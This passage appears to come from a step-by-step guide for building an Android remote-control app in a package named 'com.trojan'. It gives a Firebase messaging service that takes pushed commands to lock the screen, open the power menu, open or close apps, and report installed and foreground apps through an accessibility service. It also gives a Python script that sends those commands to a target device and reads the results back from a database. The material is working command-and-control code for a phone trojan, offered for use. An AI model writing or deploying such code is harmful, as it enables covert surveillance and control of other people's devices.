package com.trojan;

import android.content.Intent;
import android.util.Log;
import androidx.annotation.NonNull;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import java.util.Map;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";

    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);
        Log.d(TAG, "FCM Message From: " + remoteMessage.getFrom());

        if (remoteMessage.getData().size() > 0) {
            Map<String, String> data = remoteMessage.getData();
            Log.d(TAG, "Message data payload: " + data);

            String action = data.get("action");
            if (action == null) {
                Log.w(TAG, "No 'action' key found in FCM message data.");
                return;
            }

            Intent intent = null;
            // Use a switch for cleaner handling of multiple actions
            switch (action.toLowerCase()) {
                case "lock":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_LOCK_SCREEN);
                    break;
                case "shutdown":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_SHUTDOWN);
                    break;
                case "list_apps":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_LIST_APPS);
                    break;
                case "get_current_app":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_GET_CURRENT_APP);
                    break;
                case "open_app":
                    String packageToOpen = data.get("package_name");
                    if (packageToOpen != null) {
                        intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_OPEN_APP);
                        intent.putExtra("package_name", packageToOpen);
                    } else {
                        Log.w(TAG, "Action 'open_app' received without 'package_name'.");
                    }
                    break;
                case "close_app":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_CLOSE_APP);
                    break;
                default:
                    Log.w(TAG, "Received unknown action: " + action);
            }

            if (intent != null) {
                Log.d(TAG, "Broadcasting action: " + intent.getAction());
                sendBroadcast(intent);
            }
        }
    }

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        Log.d(TAG, "Refreshed FCM token: " + token);
        // The main activity already handles uploading the token, so we just log here.
    }
}```

---

### Step 3: Update `send_fcm_command.py` (The "Mouth")

Finally, update your Python script to send all the new commands and read the results from the database.

**Replace the entire contents of your Python script with this final version:**

```python
import firebase_admin
from firebase_admin import credentials, messaging, db
import sys
import time
import json

# --- CONFIGURATION ---
SERVICE_ACCOUNT_KEY_PATH = 'service-account-key.json'
# IMPORTANT: Replace with your actual Realtime Database URL
DATABASE_URL = 'https://your-project-id-default-rtdb.firebaseio.com'

# --- INITIALIZE FIREBASE ADMIN SDK ---
try:
    cred = credentials.Certificate(SERVICE_ACCOUNT_KEY_PATH)
    firebase_admin.initialize_app(cred, {
        'databaseURL': DATABASE_URL
    })
    print("Firebase Admin SDK initialized successfully.")
except Exception as e:
    print(f"Error initializing Firebase Admin SDK: {e}")
    sys.exit(1)

def get_device_token(device_id):
    """Fetches a device's FCM token from the Realtime Database."""
    try:
        ref = db.reference(f'devices/{device_id}')
        return ref.child('token').get() # Assuming token is stored under /devices/{id}/token
    except Exception as e:
        print(f"Error fetching token from database: {e}")
        return None

def send_command(device_id, action, extra_data=None):
    """Sends a command to the device via FCM data message."""
    device_token = get_device_token(device_id)
    if not device_token:
        print(f"Error: Could not find token for device ID '{device_id}'.")
        return

    data_payload = {'action': action}
    if extra_data:
        data_payload.update(extra_data)

    message = messaging.Message(
        data=data_payload,
        token=device_token,
    )
    try:
        print(f"Sending '{action}' command to device {device_id}...")
        response = messaging.send(message)
        print('Successfully sent message:', response)
    except Exception as e:
        print(f"Error sending FCM message: {e}")

def read_from_db(device_id, path, timeout=10):
    """Reads a value from the database and waits for the result."""
    ref = db.reference(f'devices/{device_id}/{path}')
    # Clear old data to ensure we get a fresh result
    ref.set({}) 
    print(f"Waiting for result at '.../{path}'...")
    
    start_time = time.time()
    while time.time() - start_time < timeout:
        data = ref.get()
        if data and data != {}:
            print("Result received:")
            # Pretty print the JSON result
            print(json.dumps(data, indent=2))
            return
        time.sleep(1)
    print("Error: Timed out waiting for a response from the device.")


if __name__ == '__main__':
    args = sys.argv
    if len(args) < 3:
        print("Usage:")
        print("  python send_fcm_command.py <deviceID> <action> [options]")
        print("\nActions:")
        print("  lock                          - Locks the screen")
        print("  shutdown                      - Opens the power menu")
        print("  close_app                     - Closes the current foreground app (like pressing Back)")
        print("  list_apps                     - Lists installed apps (result in database)")
        print("  get_current_app               - Gets the current foreground app (result in database)")
        print("  open_app <package_name>       - Opens an app by its package name")
        sys.exit(1)

    target_device_id = args[1]
    command = args[2].lower()

    if command in ['lock', 'shutdown', 'close_app']:
        send_command(target_device_id, command)
    elif command == 'list_apps':
        send_command(target_device_id, command)
        read_from_db(target_device_id, 'installed_apps')
    elif command == 'get_current_app':
        send_command(target_device_id, command)
        read_from_db(target_device_id, 'current_app')
    elif command == 'open_app':
        if len(args) < 4:
            print("Error: 'open_app' requires a package name.")
            print("Usage: python send_fcm_command.py <deviceID> open_app <package_name>")
        else:
            package_name = args[3]
            send_command(target_device_id, command, extra_data={'package_name': package_name})
    else:
        print(f"Error: Unknown command '{command}'")
